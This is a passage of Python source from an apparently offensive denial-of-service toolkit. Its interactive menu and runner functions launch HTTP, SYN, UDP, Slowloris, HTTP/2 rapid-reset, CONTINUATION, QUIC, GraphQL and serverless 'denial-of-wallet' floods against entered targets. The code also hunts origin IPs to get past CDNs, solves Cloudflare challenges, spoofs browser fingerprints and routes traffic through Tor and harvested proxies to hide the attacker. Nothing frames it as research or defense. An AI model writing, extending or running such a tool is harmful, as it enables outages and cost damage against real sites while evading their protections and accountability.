    # Serverless/DoW vectors (with live stats)
    print(f" {c('g','[+]')} Adding serverless DoW vectors")
    from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
    add_py_vector("Cold Start",
        _wrap_api_auto(DOW_ATTACK_METHODS["cold_start"],
                       url=target, duration=duration, rps=80))
    add_py_vector("Cost Acc",
        _wrap_api_auto(DOW_ATTACK_METHODS["cost_accum"],
                       url=target, duration=duration, rps=60))
    
    print(f"\n {c('g','[+]')} Total vectors: {len(vectors)}")
    print(f" {c('c','[*]')} Origin bypass: {'YES' if bypass_cdn else 'NO'}")
    print(f" {c('c','[*]')} Proxy pool: {proxy_pool.stats().get('total', 0) if proxy_pool else 0}")
    print()
    
    # PHASE 5: PARALLEL EXECUTION
    print(f" {c('c','[*]')} Phase 5: Launching Attack")
    _rich_sep()
    
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=proxy_pool,
        duration=duration, color_func=c,
        origin_ip=primary_origin, profile_info={
            "http2": profile.supports_http2,
            "cdn": profile.cdn,
            "waf": profile.waf,
            "server": profile.server,
        }
    )
    dashboard.start()
    
    try:
        results = await asyncio.gather(*tasks, return_exceptions=True)
    except KeyboardInterrupt:
        results = []
    
    await dashboard.stop()
    
    total_metrics = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
    for result in results:
        if isinstance(result, dict):
            for k in total_metrics:
                total_metrics[k] += result.get(k, 0)
    
    print()
    print_attack_summary(target, duration, total_metrics)

def print_attack_summary(target: str, duration: int, result: dict):
    import math
    tot = result.get("total_requests", result.get("total", 0))
    ok = result.get("completed", 0)
    fail = result.get("failed", 0)
    to = result.get("timeout", 0)
    elapsed = result.get("elapsed", duration)

    summary_table = Table(title="[bold]Multi-Protocol Concurrency Layer | Attack Summary[/]",
                          box=box.HEAVY_EDGE, border_style="cyan")
    summary_table.add_column("Metric", style="bold white", width=20)
    summary_table.add_column("Value", justify="right", ratio=1)
    
    summary_table.add_row("Target", f"[cyan]{target}[/]")
    summary_table.add_row("Duration", f"{int(elapsed)}s")
    summary_table.add_row("Total Requests", f"[bright_blue]{tot}[/]")
    summary_table.add_row("Completed", f"[green]{ok}[/] [dim]({ok/max(tot,1)*100:.1f}%)[/]")
    summary_table.add_row("Failed", f"[red]{fail}[/] [dim]({fail/max(tot,1)*100:.1f}%)[/]")
    summary_table.add_row("Timeout", f"[yellow]{to}[/] [dim]({to/max(tot,1)*100:.1f}%)[/]")
    summary_table.add_row("Avg RPS", f"[yellow]{ok/max(elapsed,1):.1f}[/]")
    peak = result.get("peak_rps", 0)
    if peak:
        summary_table.add_row("Peak RPS", f"[bold yellow]{peak:.1f}[/]")
    
    _RICH_CONSOLE.print()
    _RICH_CONSOLE.print(summary_table)

    os.makedirs("logs", exist_ok=True)
    log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
    try:
        with open(log, "w") as f:
            json.dump({"target": target, "duration": duration, "result": result}, f, indent=2)
        _RICH_CONSOLE.print(f"\n[bold green][+][/] Log saved: [cyan]{log}[/]")
    except Exception:
        pass

async def run_dashboard(target: str, cfg: dict):
    print(f"\n {c('c','[*]')} Starting dashboard...")
    try:
        from core.monitor.dashboard import start_dashboard
        await start_dashboard()
    except ImportError as e:
        print(f" {c('r','[-]')} Dashboard module not available: {e}")

async def _module_dispatch(module_func, multi_func, cfg, label="Target URL"):
    """Dispatch to single-target or multi-target module function."""
    print()
    raw = get_input(f" {label} ([1] enter manual, [2] target/target.txt, [ENTER] single): ").strip()
    if raw == "2":
        targets = load_target_lines()
        if not targets:
            print(f"  {c('r','[-]')} target/target.txt not found or empty")
            return False
        print(f"  {c('g','[+]')} {len(targets)} targets loaded:")
        for i, t in enumerate(targets, 1):
            print(f"      {i:2d}. {c('w',t)}")
        if multi_func:
            await multi_func(targets, cfg)
        else:
            for t in targets:
                await module_func(t, cfg)
        return True
    else:
        t = get_input(f" {label}: ").strip()
        if not t:
            return False
        if label != "Target IP/Host" and not t.startswith(("http://", "https://")):
            t = "https://" + t
        await module_func(t, cfg)
        return True

async def cmd_menu(cfg):
    env = load_env()
    global BYPASS_FLAGS
    BYPASS_FLAGS = load_bypass_flags(env)
    
    while True:
        menu()
        active = [k for k, v in BYPASS_FLAGS.items() if v]
        _RICH_CONSOLE.print()
        _RICH_CONSOLE.print(f"  [bold bright_black]Bypass:[/] [bold green]{', '.join(active)}[/]")
        _RICH_CONSOLE.print()
        
        choice = _RICH_CONSOLE.input("[bold cyan]mpc-layer[/bold cyan][bold white]@[/bold white][bold yellow]v6.0[/bold yellow][bold white] >[/bold white] ").strip().upper()
        if choice == "0":
            await run_dashboard("", cfg)
            get_input(" Press Enter to continue...")
        elif choice == "1":
            if await _module_dispatch(run_http_flood, run_http_flood_multi, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "2":
            if await _module_dispatch(run_http2_flood, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "3":
            if await _module_dispatch(run_rapid_reset, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "4":
            if await _module_dispatch(run_slowloris, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "5":
            if await _module_dispatch(run_proxy_flood, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "6":
            if await _module_dispatch(run_syn_flood, run_syn_flood_multi, cfg, label="Target IP/Host"):
                get_input(" Press Enter to continue...")
        elif choice == "7":
            if await _module_dispatch(run_udp_flood, run_udp_flood_multi, cfg, label="Target IP/Host"):
                get_input(" Press Enter to continue...")
        elif choice == "8":
            if await _module_dispatch(run_mixed_attack, run_mixed_attack_multi, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "9":
            # Auto Mode V5 - Full pipeline with 50+ vectors (replaces V3/V4)
            target = get_input(" Target URL: ")
            if not target: continue
            if not target.startswith(("http://", "https://")):
                target = "https://" + target
            duration = int(get_input(" Duration (seconds, default 300): ") or "300")
            tor_input = get_input(" Tor instances (default 3): ").strip()
            tor_cnt = max(1, int(tor_input)) if tor_input.isdigit() else 3
            print(f"\n {c('c','[*]')} Auto Mode V5 starting...")
            print(f" {c('c','[*]')} Phase 0: Profile + Origin V2  -> Phase 1: Bayesian + V5 Vectors + L4")
            print(f" {c('c','[*]')} Phase 2: Multi-Vector Attack   -> Phase 3: Report")
            from core.attack.strategies.auto_mode_v3 import run_auto_mode_v5
            result = await run_auto_mode_v5(
                target=target, duration=duration, tor_instances=tor_cnt,
            )
            get_input(" Press Enter to continue...")
        elif choice == "N":
            if await _module_dispatch(run_advanced_2026, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "L":
            if await _module_dispatch(run_business_logic_attack, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "K":
            if await _module_dispatch(run_seo_attack, None, cfg, label="Target Domain"):
                get_input(" Press Enter to continue...")
        # Advanced 2027 attacks
        elif choice == "A":
            f = lambda t, c: run_advanced_attack(t, c, "cache-bypass", "Cache-Bypass POST Flood")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "B":
            f = lambda t, c: run_advanced_attack(t, c, "smuggling", "HTTP Request Smuggling")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "C":
            f = lambda t, c: run_advanced_attack(t, c, "hpack-bomb", "HPACK Compression Bomb")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "D":
            f = lambda t, c: run_advanced_attack(t, c, "continuation", "CONTINUATION Flood (CVE-2024-27316)")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "E":
            f = lambda t, c: run_advanced_attack(t, c, "settings-flood", "HTTP/2 SETTINGS Flood")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "F":
            f = lambda t, c: run_advanced_attack(t, c, "tls-reneg", "TLS Renegotiation Flood")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "G":
            f = lambda t, c: run_advanced_attack(t, c, "post-bomb", "POST Body Bomb (50MB)")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "I":
            f = lambda t, c: run_advanced_attack(t, c, "ws-storm", "WebSocket Connection Storm")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "J":
            f = lambda t, c: run_advanced_attack(t, c, "conn-flood", "TCP Connection Storm")
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        # Intelligent tools
        elif choice == "H":
            target = get_input(" Target URL: ")
            if not target: continue
            await run_origin_hunt(target, env)
            # Offer Underminr CDN bypass after origin hunt
            if get_input(" Try Underminr CDN bypass? (Y/n): ").lower() != "n":
                await run_underminr_bypass(target)
            get_input(" Press Enter to continue...")
        elif choice == "P":
            target = get_input(" Target URL (optional, for filtering): ")
            await run_proxy_harvest(target if target else None)
            get_input(" Press Enter to continue...")
        elif choice == "M":
            toggle_bypass_features()
        # QUIC/HTTP/3 next-gen
        elif choice in ("Q","R","S"):
            qmap = {"Q": ("quic-stream-hijack", "HTTP/3 Stream Hijack"),
                    "R": ("quic-cid-flood", "QUIC Connection ID Flood"),
                    "S": ("quic-crypto-exhaust", "QUIC Crypto Handshake Exhaustion")}
            method, label = qmap[choice]
            f = lambda t, c: run_quic_attack(t, c, method, label)
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        # API Architecture attacks
        elif choice in ("T","U","V","W","X"):
            amap = {"T": ("api_rest_flood", "REST API Flood"),
                    "U": ("graphql_deep", "GraphQL Deep Nesting"),
                    "V": ("graphql_alias_bomb", "GraphQL Alias/Fragment Bomb"),
                    "W": ("grpc_flood", "gRPC Connection Flood"),
                    "X": ("json_bomb", "JSON/XML Parsing Bomb")}
            method, label = amap[choice]
            f = lambda t, c: run_api_attack(t, c, method, label)
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        # Serverless / DoW
        elif choice in ("Y","Z"):
            dmap = {"Y": ("cold_start", "Serverless Cold Start Flood"),
                    "Z": ("cost_accum", "Serverless Cost Accumulation (DoW)")}
            method, label = dmap[choice]
            f = lambda t, c: run_dow_attack(t, c, method, label)
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "!":
            # H2SMUGGLE - HTTP/2 Desync Attack
            f = lambda t, c: run_go_engine(t, c.get("attack",{}).get("default_duration",120), 50000, "h2smuggle", http2=True)
            if await _module_dispatch(f, None, cfg):
                get_input(" Press Enter to continue...")
        elif choice == "#":
            # Payload Padding - WAF buffer overflow via POST
            target = get_input(" Target URL: ")
            if not target: continue
            if not target.startswith(("http://", "https://")):
                target = "https://" + target
            print(f" {c('c','[*]')} Generating padded payload...")
            from core.attack.strategies.auto_mode_v3 import PayloadPadder
            rps = int(get_input(" RPS (default 50000): ") or "50000")
            dur = int(get_input(" Duration (default 120): ") or "120")
            result = await run_go_engine(target, dur, rps, "post-bomb")
            get_input(" Press Enter to continue...")
        else:
            print(f" {c('r','[-]')} Invalid option.")


async def run_advanced_2026(target: str, cfg: dict):
    """
    Execute advanced 2026 attack with FULL bypass integration:
    - HTTP/2 fingerprint impersonation (Chrome 126+, Firefox 130+)
    - WAF parsing bypass fuzzing (20 methods)
    - AI behavioral evasion (Markov timing, browser pool)
    - FlareSolverr Cloudflare challenge solving
    - Origin discovery (18 sources)
    - TLS/Canvas/WebGL fingerprint evasion
    - Real-time Rich progress display
    """
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    
    env = load_env()
    bypass = load_bypass_flags(env)
    
    # FEATURES PANEL
    features = {
        "H2 Impersonation": bypass.get("http2_impersonation", True),
        "WAF Parsing Bypass": bypass.get("waf_parsing_bypass", True),
        "Behavioral Evasion": bypass.get("behavioral_evasion", True),
        "FlareSolverr": bypass.get("flaresolverr", True),
        "Origin Discovery": bypass.get("origin_discovery", True),
        "Browser Pool": bypass.get("browser_pool", True),
    }
    
    feat_table = Table(box=box.SIMPLE, show_header=False, border_style="bright_black")
    feat_table.add_column("Feature", style="bold white")
    feat_table.add_column("Status", justify="center")
    for name, enabled in features.items():
        status = "[bold green]ON[/]" if enabled else "[bold red]OFF[/]"
        feat_table.add_row(name, status)
    
    _RICH_CONSOLE.print()
    _RICH_CONSOLE.print(Panel(feat_table, title="[bold cyan]ADVANCED 2026 - FULL BYPASS SUITE[/]",
                              border_style="cyan", box=box.HEAVY_EDGE))
    
    # Auto-detect FlareSolverr
    flaresolverr_ok = False
    if bypass.get("flaresolverr", True):
        flaresolverr_ok, _ = check_flaresolverr()
    
    duration = int(get_input(f"\n [bold]Duration (seconds, default 300):[/] ") or "300")
    target_rps = int(get_input(f" [bold]Target RPS (default 1000):[/] ") or "1000")
    
    _RICH_CONSOLE.print()
    _RICH_CONSOLE.print("[bold]Attack mode:[/]")
    _RICH_CONSOLE.print("  [cyan]1.[/] Hybrid (all bypass techniques)")
    _RICH_CONSOLE.print("  [cyan]2.[/] Business Logic (low-slow resource exhaustion)")
    _RICH_CONSOLE.print("  [cyan]3.[/] Origin Direct (bypass CDN, hit origin IP)")
    _RICH_CONSOLE.print("  [cyan]4.[/] Smart (auto-probe WAF, adapt in real-time)")
    mode_choice = get_input(" [bold]Choose [1/2/3/4] (default 4):[/] ").strip() or "4"
    
    mode_map = {"1": "hybrid", "2": "business_logic", "3": "origin_direct", "4": "smart"}
    attack_mode = mode_map.get(mode_choice, "smart")
    
    try:
        from core.bypass.orchestrator import execute_advanced_attack
        
        # LIVE PROGRESS DISPLAY
        from rich.live import Live
        from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
        
        start_time = time.time()
        
        progress = Progress(
            SpinnerColumn(spinner_name="dots"),
            TextColumn("[bold]{task.description}"),
            BarColumn(bar_width=30, complete_style="cyan", finished_style="green"),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        )
        task_id = progress.add_task("[cyan]ADVANCED 2026 ATTACK[/]", total=duration)
        
        # Status tracking
        status_text = "[yellow]Initializing bypass engines...[/]"
        phase_text = "[bright_black]Phase: Reconnaissance[/]"
        stats_line = "[bright_black]Waiting for attack data...[/]"
        
        def build_display():
            elapsed = time.time() - start_time
            progress.update(task_id, completed=min(elapsed, duration))
            remaining = max(0, duration - int(elapsed))
            
            info_panel = Panel(
                f"[bold white]Target:[/] [cyan]{target}[/]\n"
                f"[bold white]Mode:[/] [yellow]{attack_mode.upper()}[/]  |  "
                f"[bold white]Duration:[/] [green]{duration}s[/]  |  "
                f"[bold white]RPS:[/] [green]{target_rps}[/]  |  "
                f"[bold white]Elapsed:[/] {int(elapsed)}s  |  "
                f"[bold white]Remaining:[/] {remaining}s",
                border_style="bright_black",
                title="[bold cyan]◆ Attack Info ◆[/]",
            )
            
            status_panel = Panel(
                f"{status_text}\n{phase_text}\n{stats_line}",
                border_style="bright_black",
                title="[bold cyan]◆ Status ◆[/]",
            )
            
            layout = Layout()
            layout.split(
                Layout(info_panel, size=6),
                Layout(Panel(progress, border_style="bright_black"), size=5),
                Layout(status_panel),
            )
            return layout
        
        with Live(build_display(), refresh_per_second=4, console=_RICH_CONSOLE) as live:
            status_text = "[yellow]Executing reconnaissance...[/]"
            phase_text = "[cyan]Phase: Reconnaissance | WAF Probe | Origin Discovery[/]"
            live.update(build_display())
            
            # Run the attack in a task
            async def run_attack():
                result = await execute_advanced_attack(
                    target_url=target,
                    duration=duration,
                    target_rps=target_rps,
                    attack_mode=attack_mode,
                    use_waf_bypass=bypass.get("waf_parsing_bypass", True),
                    use_http2_impersonation=bypass.get("http2_impersonation", True),
                    use_flaresolverr=flaresolverr_ok,
                )
                return result
            
            attack_task = asyncio.create_task(run_attack())
            
            # Poll for completion while updating display
            while not attack_task.done():
                elapsed = time.time() - start_time
                if elapsed < duration * 0.3:
                    phase_text = "[cyan]Phase: Reconnaissance & Session Setup[/]"
                elif elapsed < duration * 0.6:
                    phase_text = "[green]Phase: Attack Execution (Ramping Up)[/]"
                else:
                    phase_text = "[bold green]Phase: Full Attack / Cooldown[/]"
                
                stats_line = f"[bright_black]Requests being processed...[/]"
                status_text = "[bold green]● ACTIVE[/]"
                live.update(build_display())
                await asyncio.sleep(0.25)
            
            result = attack_task.result()
            
            status_text = "[bold green]● COMPLETE[/]"
            phase_text = "[green]All phases finished[/]"
            elapsed = time.time() - start_time
            progress.update(task_id, completed=min(elapsed, duration))
            
            # Build results
            phases = result.get('phases', [])
            results_lines = []
            total_req = 0
            total_success = 0
            
            for phase in phases:
                pname = phase.get('phase', 'unknown')
                presults = phase.get('results', {})
                if isinstance(presults, dict):
                    if 'sessions_created' in presults:
                        results_lines.append(f"[bold]Sessions:[/] [green]{presults['sessions_created']}[/]")
                    if 'working_methods' in presults:
                        wm = presults['working_methods']
                        results_lines.append(f"[bold]WAF bypass:[/] [green]{len(wm)} methods[/]")
                        for m in wm[:3]:
                            if isinstance(m, dict):
                                results_lines.append(f"  [dim]- {m.get('name','?')}[/]")
                    if 'total_requests' in presults:
                        total_req = presults.get('total_requests', 0)
                        total_success = presults.get('successful', 0)
                        rate = presults.get('success_rate', 0)
                        results_lines.append(f"[bold]Requests:[/] [bright_blue]{total_req}[/]")
                        results_lines.append(f"[bold]Success:[/] [green]{total_success}[/]/[bright_blue]{total_req}[/]")
                        results_lines.append(f"[bold]Rate:[/] [yellow]{rate*100:.1f}%[/]")
            
            stats_line = "\n".join(results_lines) if results_lines else "[yellow]No detailed stats available[/]"
            live.update(build_display())
            
            # Small delay to show final state
            await asyncio.sleep(1.5)
        
        # FINAL RICH SUMMARY
        summary_table = Table(title="[bold green]ADVANCED 2026 - ATTACK COMPLETE[/]",
                              box=box.HEAVY_EDGE, border_style="green")
        summary_table.add_column("Metric", style="bold white")
        summary_table.add_column("Value", justify="right")
        summary_table.add_row("Target", f"[cyan]{target}[/]")
        summary_table.add_row("Mode", f"[yellow]{attack_mode.upper()}[/]")
        summary_table.add_row("Duration", f"{int(time.time() - start_time)}s")
        summary_table.add_row("Total Requests", f"[bright_blue]{total_req}[/]")
        summary_table.add_row("Success", f"[green]{total_success}[/] / [bright_blue]{total_req}[/]")
        if total_req > 0:
            rate = (total_success / total_req) * 100
            summary_table.add_row("Success Rate", f"[yellow]{rate:.1f}%[/]")
        
        _RICH_CONSOLE.print()
        _RICH_CONSOLE.print(summary_table)
        _RICH_CONSOLE.print()
        
    except Exception as e:
        _RICH_CONSOLE.print(f"\n[bold red]Advanced 2026 error:[/] {e}")
        import traceback
        traceback.print_exc()
        _RICH_CONSOLE.print(f"\n[bold yellow]Falling back to handler implementation...[/]")
        from core.handlers.advanced_handlers import run_advanced_2026 as handler
        await handler(target, cfg)


async def run_business_logic_attack(target: str, cfg: dict):
    """Execute business logic attack."""
    from core.handlers.advanced_handlers import run_business_logic_attack as handler
    await handler(target, cfg)


async def run_seo_attack(target: str, cfg: dict):
    """Execute SEO attack."""
    from core.handlers.advanced_handlers import run_seo_attack as handler
    await handler(target, cfg)

async def run_advanced_attack(target: str, cfg: dict, method: str, label: str):
    """Generic runner for advanced 2027 attacks with LIVE DASHBOARD"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    rps = int(get_input(" RPS / threads (default 1000): ") or "1000")
    threads = int(get_input(" Workers (default 100): ") or "100")

    # Auto-load saved origin if available
    origin_ip = ""
    try:
        from core.recon.origin.origin_store import load_hunt, get_best_origin, is_ip_address
        # If user already gave bare IP as target, treat as origin already
        if is_ip_address(target.replace("https://","").replace("http://","").split("/")[0]):
            origin_ip = ""  # target IS the origin, no spoof needed
            print(f" {c('y','[*]')} Target is bare IP - direct connection, no Host spoofing")
        else:
            saved = load_hunt(target)
            if saved and (saved.get("verified_origins") or saved.get("candidates")):
                best = get_best_origin(target)
                if best:
                    print(f" {c('g','[+]')} Found saved origin: {c('w', best)} (use this? [Y/n])")
                    use_saved = get_input("   ").lower() != "n"
                    if use_saved:
                        origin_ip = best
    except Exception:
        pass

    if not origin_ip:
        use_origin = get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y"
        if use_origin:
            try:
                from core.recon.origin.origin_hunter import OriginHunter
                env = load_env()
                print(f" {c('c','[*]')} Hunting origin IP...")
                hunter = OriginHunter(timeout=8)
                report = await hunter.hunt(target, env=env)
                if report.verified_origins:
                    origin_ip = report.verified_origins[0]
                    print(f" {c('g','[+]')} Origin found: {origin_ip}")
                elif report.candidates:
                    origin_ip = report.candidates[0].ip
                    print(f" {c('y','[*]')} Best candidate: {origin_ip} ({report.candidates[0].confidence:.0%})")
                else:
                    print(f" {c('y','[!]')} No origin found - hitting CDN edge")
            except Exception as e:
                print(f" {c('y','[!]')} Origin hunt failed: {e}")

    # Ask about proxies for ALL methods
    print(f"\n {c('c','[*]')} Proxy option:")
    print(f"   {c('c','[1]')} Use existing proxy file(s)")
    print(f"   {c('c','[2]')} Use Tor network (SOCKS5)")
    print(f"   {c('c','[3]')} No proxies")
    proxy_sel = get_input(" Choose [1/2/3] (default 3): ").strip() or "3"
    proxy_pool = None

    if proxy_sel == "2":
        # Tor
        print(f" {c('c','[*]')} Setting up Tor network...")
        try:
            from core.network.tor_manager import get_tor_manager
            tor_instances = int(get_input(" Tor instances [1-20] (default 5): ") or "5")
            tor_instances = max(1, min(20, tor_instances))
            manager = get_tor_manager(instances=tor_instances)
            if not manager.is_tor_installed():
                if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
                    manager.install_tor()
            if manager.is_tor_installed():
                manager.setup_instances()
                success = manager.start_all(wait_bootstrap=False)
                if success > 0:
                    print(f" {c('c','[*]')} Waiting for Tor bootstrap...")
                    for _ in range(120):
                        done = True
                        for inst in manager.instances:
                            if inst.pid:
                                if not manager.wait_for_bootstrap(inst, timeout=3):
                                    done = False
                        if done:
                            break
                        await asyncio.sleep(1)
                    await asyncio.sleep(3)
                    health = await manager.check_all_health()
                    healthy = [h for h in health if h.get('is_tor')]
                    if healthy:
                        from core.network.proxy import ProxyPool
                        proxy_pool = ProxyPool(connect_timeout=10)
                        for h in healthy:
                            socks_port = 9050 + (h['instance_id'] - 1) * 2
                            proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
                        print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
        except Exception as e:
            print(f" {c('r','[-]')} Tor setup failed: {e}")

    elif proxy_sel == "1":
        proxy_file = get_input(" Proxy file path (default proxies/alive.txt): ").strip() or "proxies/alive.txt"
        if not os.path.exists(proxy_file):
            harvest = get_input(f" {proxy_file} not found. Auto-harvest? (Y/n): ").lower() != "n"
            if harvest:
                from core.network.proxy_harvester import auto_harvest_and_validate
                print(f" {c('c','[*]')} Harvesting proxies...")
                last_print = [0]
                def progress(stage, current, alive):
                    import time as _t
                    now = _t.time()
                    if now - last_print[0] < 0.5:
                        return
                    last_print[0] = now
                    if stage == "validate":
                        print(f"\r {c('c','[*]')} Validating: {current} | alive: {c('g',str(alive))}   ", end="", flush=True)
                result = await auto_harvest_and_validate(
                    target_url=target, save_path=proxy_file, min_rtt_ms=3000,
                    progress_cb=progress,
                )
                print(f"\n {c('g','[+]')} {result['fast_alive']} fast proxies ready")
                proxy_file_to_load = proxy_file
            else:
                proxy_file_to_load = None
        else:
            proxy_file_to_load = proxy_file

        if proxy_file_to_load and os.path.exists(proxy_file_to_load):
            from core.network.proxy import ProxyPool
            proxy_pool = ProxyPool(connect_timeout=5)
            count = await proxy_pool.load_file(proxy_file_to_load)
            print(f" {c('g','[+]')} Loaded {count} proxies from {proxy_file_to_load}")

    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | RPS={rps} threads={threads}")
    if origin_ip:
        print(f" {c('g','[+]')} Bypass mode via origin: {c('w', origin_ip)}")
    if proxy_pool:
        print(f" {c('g','[+]')} Proxy pool active: {proxy_pool.stats().get('total', 0)} proxies")
    _rich_sep()

    # Export proxy file for Go engine if proxy_pool exists
    proxy_file_for_go = ""
    if proxy_pool:
        urls = []
        for plist in proxy_pool._pools.values():
            for ps in plist:
                urls.append(ps.url)
        if urls:
            proxy_file_for_go = f"proxies/_temp_{method}.txt"
            os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
            with open(proxy_file_for_go, "w") as f:
                f.write("\n".join(urls))

    # Create single vector with live dashboard
    vectors = []
    vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    # Start live dashboard
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=proxy_pool,
        duration=duration, color_func=c,
        origin_ip=origin_ip, profile_info={},
    )
    dashboard.start()
    
    try:
        result = await run_go_engine(
            target=target, duration=duration, rps=rps,
            method=method, threads=threads, origin_ip=origin_ip,
            proxy_file=proxy_file_for_go, live_stats=vec
        )
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
    
    await dashboard.stop()

    print_attack_summary(target, duration, result)


async def run_quic_attack(target: str, cfg: dict, method: str, label: str):
    """QUIC/HTTP/3 attacks with LIVE DASHBOARD"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    duration = int(get_input(f" Duration (seconds, default 120): ") or "120")
    rps = int(get_input(f" Conn/s (default 500): ") or "500")
    threads = int(get_input(f" Workers (default 50): ") or "50")
    max_conns = int(get_input(f" Max concurrent (default 2000): ") or "2000")
    
    opts = await prompt_attack_options(target, ask_origin=False)

    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps} threads={threads} maxc={max_conns}")
    if opts["proxy_pool"]:
        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
    _rich_sep()

    # Export proxy file for Go engine if proxy_pool exists
    proxy_file_for_go = ""
    if opts["proxy_pool"]:
        urls = []
        for plist in opts["proxy_pool"]._pools.values():
            for ps in plist:
                urls.append(ps.url)
        if urls:
            proxy_file_for_go = f"proxies/_temp_{method}.txt"
            os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
            with open(proxy_file_for_go, "w") as f:
                f.write("\n".join(urls))

    # Create single vector with live dashboard
    vectors = []
    vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    # Start live dashboard
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
        duration=duration, color_func=c,
        origin_ip="", profile_info={},
    )
    dashboard.start()
    
    try:
        result = await run_go_engine(
            target=target, duration=duration, rps=rps,
            method=method, threads=threads, proxy_file=proxy_file_for_go,
            live_stats=vec
        )
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
    
    await dashboard.stop()
    
    print_attack_summary(target, duration, result)


async def run_api_attack(target: str, cfg: dict, method: str, label: str):
    """API attacks with LIVE DASHBOARD"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    duration = int(get_input(f" Duration (seconds, default 120): ") or "120")
    rps = int(get_input(f" RPS (default 200): ") or "200")
    
    opts = await prompt_attack_options(target, ask_origin=False)

    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps}")
    if opts["proxy_pool"]:
        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
    _rich_sep()

    # Create single vector with live dashboard
    vectors = []
    vec = {"label": label, "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    # Start live dashboard
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
        duration=duration, color_func=c,
        origin_ip="", profile_info={},
    )
    dashboard.start()
    
    try:
        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
        func = API_ATTACK_METHODS.get(method)
        if not func:
            print(f" {c('r','[-]')} Unknown API attack: {method}")
            await dashboard.stop()
            return
        result = await func(url=target, duration=duration, rps=rps, proxy_pool=opts["proxy_pool"], live_stats=vec)
        vec["status"] = "done"
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()
    
    print_attack_summary(target, duration, result)


async def run_dow_attack(target: str, cfg: dict, method: str, label: str):
    """Serverless DoW attacks with LIVE DASHBOARD"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    duration = int(get_input(f" Duration (seconds, default 120): ") or "120")
    rps = int(get_input(f" RPS (default 100): ") or "100")
    
    opts = await prompt_attack_options(target, ask_origin=False)

    print(f"\n {c('c','[*]')} {label} | {target} | {duration}s | rps={rps}")
    print(f" {c('c','[*]')} Denial-of-Wallet: triggers auto-scaling, burns compute budget")
    if opts["proxy_pool"]:
        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
    _rich_sep()

    # Create single vector with live dashboard
    vectors = []
    vec = {"label": label, "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    # Start live dashboard
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
        duration=duration, color_func=c,
        origin_ip="", profile_info={},
    )
    dashboard.start()
    
    try:
        from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
        func = DOW_ATTACK_METHODS.get(method)
